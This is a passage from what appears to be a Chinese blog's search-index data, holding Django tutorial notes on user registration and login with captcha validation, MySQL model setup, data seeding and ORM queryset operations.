&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;h1&gt;welcome &#123;% if data %&#125;&#123;% for data in data%&#125; &#123;% if &apos;no&apos; not in data %&#125; &#123;&#123;data&#125;&#125; &lt;a href=&quot;/sign_out/&quot;&gt;退出&lt;/a&gt; &#123;% endif%&#125; &#123;% endfor %&#125; &#123;% endif %&#125;&lt;/h1&gt;</span><br><span class=\"line\">&lt;a href=&quot;/login/&quot;&gt;登录 &lt;/a&gt;</span><br><span class=\"line\">&lt;br&gt;</span><br><span class=\"line\">&lt;a href=&quot;/register/&quot;&gt;注册 &lt;/a&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>login.html<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;登录页面&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class=\"line\">    &#123;% csrf_token %&#125;</span><br><span class=\"line\">    &#123;&#123;userform&#125;&#125;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; name=&quot;sumit&quot; value=&quot;login&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;a href=&quot;/&quot;&gt;首页 &lt;/a&gt;</span><br><span class=\"line\">&lt;br&gt;</span><br><span class=\"line\">&lt;a href=&quot;/register/&quot;&gt;注册 &lt;/a&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>register.html<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;注册页面&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class=\"line\">    &#123;% csrf_token %&#125;</span><br><span class=\"line\">    &#123;&#123;userform&#125;&#125;</span><br><span class=\"line\">    验证码 &lt;input type=&quot;text&quot; name=&quot;cap&quot;&gt; &lt;img src=&quot;&#123;&#123;&apos;/captcha/&apos;&#125;&#125;&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; name=&quot;sumit&quot; value=&quot;register&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;a href=&quot;/login/&quot;&gt;登录 &lt;/a&gt;</span><br><span class=\"line\">&lt;br&gt;</span><br><span class=\"line\">&lt;a href=&quot;/&quot;&gt;首页 &lt;/a&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>项目代码<a href=\"https://github.com/Huseck/Django-study/tree/Django-study-4\" target=\"_blank\" rel=\"noopener\">https://github.com/Huseck/Django-study/tree/Django-study-4</a><br>本篇的运行结果图<br><img src=\"2.jpg\" alt=\"\"></p>\n<h3 id=\"例子四（2）\"><a href=\"#例子四（2）\" class=\"headerlink\" title=\"例子四（2）\"></a>例子四（2）</h3><ul>\n<li>主要关注的几个逻辑问题<ul>\n<li>怎么判断用户名是否重名</li>\n<li>继承自带的auth.user表是否能添加我们还需要的字段</li>\n<li>使用DjangoCaptcha判断机制是否符合要求</li>\n<li>forms继承的关系和判断form表单数据</li>\n<li>准备</li>\n<li>这里我们使用自带的auth_user实现注册、登录验证。</li>\n<li>安装pip install django-simple-captcha==0.5.6</li>\n<li>配置 settings.py</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSTALLED_APPS = (</span><br><span class=\"line\">    &apos;django.contrib.admin&apos;,</span><br><span class=\"line\">    &apos;django.contrib.auth&apos;,</span><br><span class=\"line\">    &apos;django.contrib.contenttypes&apos;,</span><br><span class=\"line\">    &apos;django.contrib.sessions&apos;,</span><br><span class=\"line\">    &apos;django.contrib.messages&apos;,</span><br><span class=\"line\">    &apos;django.contrib.staticfiles&apos;,</span><br><span class=\"line\">    &apos;blog&apos;,</span><br><span class=\"line\">    &apos;captcha&apos;,</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>根目录下的urls.py也要配置验证码的路由</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    url(r&apos;&apos;, include(&apos;blog.urls&apos;)),</span><br><span class=\"line\">    url(r&apos;^admin/&apos;, include(admin.site.urls)),</span><br><span class=\"line\">    url(r&apos;^captcha/&apos;, include(&apos;captcha.urls&apos;)),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>之后我们生成默认的数据库，成功之后会发现是有captcha_captchastore表的<br>然后开始编写我们的forms表单，blog目录下创建forms.py文件代码如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\">#-*- coding:utf-8 _*-</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">author:seck</span><br><span class=\"line\">time: 2018/02/09</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">from django import forms</span><br><span class=\"line\">from captcha.fields import CaptchaField</span><br><span class=\"line\">from django.contrib.auth.forms import UserCreationForm, AuthenticationForm</span><br><span class=\"line\">from .models import Users</span><br><span class=\"line\">class CreateUser(UserCreationForm):</span><br><span class=\"line\">    #UserCreationForm  里面自带的会验证重名</span><br><span class=\"line\">    username = forms.CharField(error_messages=&#123;&apos;required&apos;:u&quot;用户名不能为空&quot;&#125;)</span><br><span class=\"line\">    password = forms.CharField(widget=forms.PasswordInput(),error_messages=&#123;&apos;required&apos;:u&quot;密码不能为空&quot;&#125;)</span><br><span class=\"line\">    email = forms.CharField()</span><br><span class=\"line\">    captcha = CaptchaField()</span><br><span class=\"line\">class Auth(AuthenticationForm):</span><br><span class=\"line\">    username = forms.CharField(error_messages=&#123;&apos;required&apos;: &apos;用户名不能为空&apos;&#125;)</span><br><span class=\"line\">    password = forms.CharField(widget=forms.PasswordInput(),error_messages=&#123;&apos;required&apos;:u&quot;密码不能为空&quot;&#125;)</span><br><span class=\"line\">    captcha = CaptchaField()</span><br></pre></td></tr></table></figure>\n<p>我们编写一下视图函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">from django.shortcuts import render,redirect</span><br><span class=\"line\">from django.http import HttpResponse</span><br><span class=\"line\">from django.contrib.auth import authenticate, login, logout</span><br><span class=\"line\">from django.contrib.auth import models</span><br><span class=\"line\">from django.contrib.auth.models import User</span><br><span class=\"line\">from .forms import CreateUser,Auth</span><br><span class=\"line\">def index(request):</span><br><span class=\"line\">    return render(request,&apos;blog/index.html&apos;)</span><br><span class=\"line\">def register(request):</span><br><span class=\"line\">    createform = CreateUser(data=request.POST or None)</span><br><span class=\"line\">    if request.method == &quot;POST&quot;:</span><br><span class=\"line\">        if createform.is_valid():</span><br><span class=\"line\">            username = createform.clean_username()</span><br><span class=\"line\">            password = createform.clean_password2()</span><br><span class=\"line\">            email = createform.clean()[&apos;email&apos;]</span><br><span class=\"line\">            #django 默认的user表创建用户使用create_user函数</span><br><span class=\"line\">            user = User.objects.create_user(username=username,password=password,email=email)</span><br><span class=\"line\">            user.save()</span><br><span class=\"line\">            return HttpResponse(u&quot;注册成功&quot;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            error_msg = createform.errors</span><br><span class=\"line\">            print error_msg</span><br><span class=\"line\">            return render(request,&apos;blog/register.html&apos;,&#123;&quot;errors&quot;:error_msg&#125;)</span><br><span class=\"line\">    return render(request,&apos;blog/register.html&apos;,&#123;&quot;createform&quot;:createform&#125;)</span><br><span class=\"line\">def auth(request):</span><br><span class=\"line\">    authform = Auth(data=request.POST or None)</span><br><span class=\"line\">    if request.method == &quot;POST&quot;:</span><br><span class=\"line\">        #判断输入的数据是否符合规则</span><br><span class=\"line\">        if authform.is_valid():</span><br><span class=\"line\">            login(request,authform.get_user())</span><br><span class=\"line\">            return render(request,&apos;blog/index.html&apos;,&#123;&#125;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            #如果数据不符合规则，就显示错误信息</span><br><span class=\"line\">            error_msg=authform.errors</span><br><span class=\"line\">            print authform.errors</span><br><span class=\"line\">            return render(request, &apos;blog/login.html&apos;, &#123;&quot;userform&quot;: authform, &quot;errors&quot;: error_msg&#125;)</span><br><span class=\"line\">    return render(request,&apos;blog/login.html&apos;,&#123;&quot;userform&quot;:authform&#125;)</span><br><span class=\"line\">def sign_out(request):</span><br><span class=\"line\">    logout(request)</span><br><span class=\"line\">    return redirect(&quot;/&quot;)</span><br></pre></td></tr></table></figure>\n<p>问题一验证重名<br>我们的CreateForm继承UserCreateForm 这个类继承User 这个又继承AbstractUser<br>然后找到关键位置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在文件site-packages\\django\\contrib\\auth\\models.py  394行左右找到</span><br><span class=\"line\">error_messages=&#123;</span><br><span class=\"line\">            &apos;unique&apos;: _(&quot;A user with that username already exists.&quot;),</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    也就是is_valid  方法判断error是否有错误存在判断出重名  username 是unique=True 值唯一的定义</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"问题二验证码\"><a href=\"#问题二验证码\" class=\"headerlink\" title=\"问题二验证码\"></a>问题二验证码</h3><p>当我们登录或者注册一个用户的时候，浏览器点击返回，在用此验证码注册其他的账号时，验证码应该是失效的，django-simple-captcha满足。<br>问题三form表单的继承<br>我们继承了UserCreationForm 和AuthenticationForm进行数据的验证，使用自带的验证方法实现用户的注册和登录。</p>\n<h3 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h3><p>当django自带的数据表和验证方法不满足需求时，需要自行扩展接口功能，实现应用。</p>\n","categories":["Django"],"tags":["Django"]},{"title":"Django学习笔记(三)","url":"https://www.xjseck.com/2018/02/01/Django学习笔记-三/","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><ol>\n<li>通过上一个笔记的学习，我们大致明白了Django怎么从Views 传到url中然后在templates中进行显示内容。这一篇我们讲学习models控制数据库数据进行操作。相关内容如下：<ul>\n<li>Django Models中相关的字段</li>\n<li>Django ORM模式的理解</li>\n<li>Django Models操作<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3>上一篇的源代码中blog目录下的Models.py中建立了相关的数据类。只需要执行如下命令就能在相应的数据库中建立表。源代码<a href=\"https://github.com/Huseck/Django-study/tree/Django-study-3\" target=\"_blank\" rel=\"noopener\">https://github.com/Huseck/Django-study/tree/Django-study-3</a><br>需要配置mysql的连接信息，以及创建数据库。<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$python manage.py makemigrations</span><br><span class=\"line\">$python manage.py migrate</span><br><span class=\"line\">#之后我们进行数据操作</span><br><span class=\"line\">$python manage.py shell   #进入shell命令下进行操作</span><br><span class=\"line\">&gt;&gt;&gt;from blog.models import New  #导入所需的模块</span><br><span class=\"line\">&gt;&gt;&gt;from datetime import * </span><br><span class=\"line\">#进行数据的增、删、改、查</span><br><span class=\"line\">&gt;&gt;&gt;New.objects.create(title=&quot;test1&quot;,body=&apos;test1&apos;,created_time=datetime.now(),modified_time=datetime.now(),author_id=1,category_id=1)</span><br><span class=\"line\">&gt;&gt;&gt;New.objects.get(title=&apos;test1&apos;).delete()</span><br><span class=\"line\">&gt;&gt;&gt;N=New.objects.get(title=&apos;seck&apos;)</span><br><span class=\"line\">&gt;&gt;&gt;N.body=(&apos;seck-test&apos;)</span><br><span class=\"line\">&gt;&gt;&gt;N.save()</span><br><span class=\"line\">#进行查操作显示数据的时候，注意要在Models.py中进行添加</span><br><span class=\"line\">    def __unicode__(self):</span><br><span class=\"line\">        return self.title</span><br><span class=\"line\">#其他filter 切片等操作自行百度学习</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"例子三\"><a href=\"#例子三\" class=\"headerlink\" title=\"例子三\"></a>例子三</h3><p>本例子中我们学习models模型操作数据库。<br>首先还是新建项目</p>\n<p>settings.py中配置Mysql<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DATABASES = &#123;</span><br><span class=\"line\">&apos;default&apos;: &#123;</span><br><span class=\"line\">    &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;,</span><br><span class=\"line\">    &apos;NAME&apos;: &apos;django-model&apos;,</span><br><span class=\"line\">    &apos;USER&apos;: &apos;root&apos;,</span><br><span class=\"line\">    &apos;PASSWORD&apos;: &apos;pass&apos;,</span><br><span class=\"line\">    &apos;HOST&apos;: &apos;127.0.0.1&apos;,</span><br><span class=\"line\">    &apos;PORT&apos;: &apos;3306&apos;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>然后创建app models.py代码如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">from django.db import models</span><br><span class=\"line\"># Create your models here.</span><br><span class=\"line\">from django.db import models</span><br><span class=\"line\">from django.utils.encoding import python_2_unicode_compatible</span><br><span class=\"line\">@python_2_unicode_compatible</span><br><span class=\"line\">class Author(models.Model):</span><br><span class=\"line\">    name = models.CharField(max_length=50)</span><br><span class=\"line\">    qq = models.CharField(max_length=10)</span><br><span class=\"line\">    addr = models.TextField()</span><br><span class=\"line\">    email = models.EmailField()</span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return self.name</span><br><span class=\"line\">@python_2_unicode_compatible</span><br><span class=\"line\">class Article(models.Model):</span><br><span class=\"line\">    title = models.CharField(max_length=50)</span><br><span class=\"line\">    author = models.ForeignKey(Author)</span><br><span class=\"line\">    content = models.TextField()</span><br><span class=\"line\">    score = models.IntegerField()  # 文章的打分</span><br><span class=\"line\">    tags = models.ManyToManyField(&apos;Tag&apos;)</span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return self.title</span><br><span class=\"line\">@python_2_unicode_compatible</span><br><span class=\"line\">class Tag(models.Model):</span><br><span class=\"line\">    name = models.CharField(max_length=50)</span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return self.name</span><br></pre></td></tr></table></figure></p>\n<p>导入数据 initdb.py<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\">#-*- coding:utf-8 _*-</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">author:seck</span><br><span class=\"line\">time: 2018/01/26</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">import random</span><br><span class=\"line\">from blog_week_5.wsgi import *</span><br><span class=\"line\">from Model_study.models import Author, Article, Tag</span><br><span class=\"line\">author_name_list = [&apos;xjnu&apos;, &apos;seck&apos;, &apos;sfdx&apos;, &apos;test&apos;, &apos;xjseck&apos;]</span><br><span class=\"line\">article_title_list = [&apos;Django 笔记&apos;, &apos;Python 学习&apos;, &apos;HTML 学习&apos;]</span><br><span class=\"line\">def create_authors():</span><br><span class=\"line\">    for author_name in author_name_list:</span><br><span class=\"line\">        author, created = Author.objects.get_or_create(name=author_name)</span><br><span class=\"line\">        # 随机生成9位数的QQ，</span><br><span class=\"line\">        author.qq = &apos;&apos;.join(</span><br><span class=\"line\">            str(random.choice(range(10))) for _ in range(9)</span><br><span class=\"line\">        )</span><br><span class=\"line\">        author.addr = &apos;addr_%s&apos; % (random.randrange(1, 3))</span><br><span class=\"line\">        author.email = &apos;%s@seck.com&apos; % (author.addr)</span><br><span class=\"line\">        author.save()</span><br><span class=\"line\">def create_articles_and_tags():</span><br><span class=\"line\">    # 随机生成文章</span><br><span class=\"line\">    for article_title in article_title_list:</span><br><span class=\"line\">        # 从文章标题中得到 tag</span><br><span class=\"line\">        tag_name = article_title.split(&apos; &apos;, 1)[0]</span><br><span class=\"line\">        tag, created = Tag.objects.get_or_create(name=tag_name)</span><br><span class=\"line\">        random_author = random.choice(Author.objects.all())</span><br><span class=\"line\">        for i in range(1, 21):</span><br><span class=\"line\">            title = &apos;%s_%s&apos; % (article_title, i)</span><br><span class=\"line\">            article, created = Article.objects.get_or_create(</span><br><span class=\"line\">                title=title, defaults=&#123;</span><br><span class=\"line\">                    &apos;author&apos;: random_author,  # 随机分配作者</span><br><span class=\"line\">                    &apos;content&apos;: &apos;%s 正文&apos; % title,</span><br><span class=\"line\">                    &apos;score&apos;: random.randrange(70, 101),  # 随机给文章一个打分</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            )</span><br><span class=\"line\">            article.tags.add(tag)</span><br><span class=\"line\">def main():</span><br><span class=\"line\">    create_authors()</span><br><span class=\"line\">    create_articles_and_tags()</span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    main()</span><br><span class=\"line\">    print(&quot;Done!&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">Django queryset 进行的操作</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li><p>查看所执行的SQL语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$python manage.py shell</span><br><span class=\"line\">&gt;&gt;&gt;from Model_study.models import Article,Author,Tag</span><br><span class=\"line\">&gt;&gt;&gt; print str(Author.objects.all().query)  #打印所执行的sql语句</span><br><span class=\"line\">&gt;&gt;&gt; Author.objects.all().query.__str__() #这样也可以（只对select有用）</span><br><span class=\"line\">&gt;&gt;&gt; Author=Author.objects.values_list(&apos;name&apos;,&apos;qq&apos;)</span><br><span class=\"line\">&gt;&gt;&gt; Author   #以元祖形式输出结果</span><br><span class=\"line\">&gt;&gt;&gt; Author.objects.values_list(&apos;name&apos;,flat=True) #指定一个字段</span><br><span class=\"line\">&gt;&gt;&gt; Article.objects.filter(author__name=&apos;xjnu&apos;).values_list(&apos;title&apos;,flat=True) #多表查询</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查询结果排序</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt;Author.objects.all().order_by(&apos;name&apos;) </span><br><span class=\"line\">&gt;&gt;&gt; Author.objects.all().order_by(&apos;-name&apos;); #倒序排列</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>支持正则 Where 查询</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt;Author.objects.filter(name__regex=&apos;^s.+&apos;).exclude(qq=399753917)</span><br><span class=\"line\">#字段名+ 两个下划线 参考https://www.cnblogs.com/BigJ/p/7530516.html </span><br><span class=\"line\">#exclude 类似SQL语句的where</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>索引查询</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; Author.objects.all()[:1]  #不支持负数</span><br><span class=\"line\">&gt;&gt;&gt; Author.objects.all().reverse()[0]</span><br><span class=\"line\">&gt;&gt;&gt; Author.objects.order_by(&apos;-id&apos;)[0]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>和SQL语句进行显示调试，此方法能显示所有执行的sql语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    首先在settings.py最后加上</span><br><span class=\"line\">    LOGGING = &#123;</span><br><span class=\"line\">    &apos;version&apos;: 1,</span><br><span class=\"line\">    &apos;disable_existing_loggers&apos;: False,</span><br><span class=\"line\">    &apos;handlers&apos;: &#123;</span><br><span class=\"line\">        &apos;console&apos;: &#123;</span><br><span class=\"line\">            &apos;class&apos;: &apos;logging.StreamHandler&apos;,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &apos;loggers&apos;: &#123;</span><br><span class=\"line\">        &apos;django.db.backends&apos;: &#123;</span><br><span class=\"line\">            &apos;handlers&apos;: [&apos;console&apos;],</span><br><span class=\"line\">            &apos;level&apos;: &apos;DEBUG&apos; if DEBUG else &apos;INFO&apos;,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    然后在$python manage.py shell</span><br><span class=\"line\">    下进行操作会显示sql语句</span><br><span class=\"line\">    &gt;&gt;&gt; from Model_study.models import Article,Author ,Tag</span><br><span class=\"line\">    &gt;&gt;&gt; a=Article.objects.get(pk=1)</span><br><span class=\"line\">    (0.000) SET SQL_AUTO_IS_NULL = 0; args=None</span><br><span class=\"line\">    (0.000) SET SQL_AUTO_IS_NULL = 0; args=None</span><br><span class=\"line\">    (0.000) SELECT `Model_study_article`.`id`, `Model_study_article`.`title`, `Model_study_article`.`author_id`, `Model_study_article`.`content`, `Model_study_article`.`score` FROM `Model_study_article` WHERE `Model_study_article`.`id` = 1; args=(1,)</span><br><span class=\"line\">    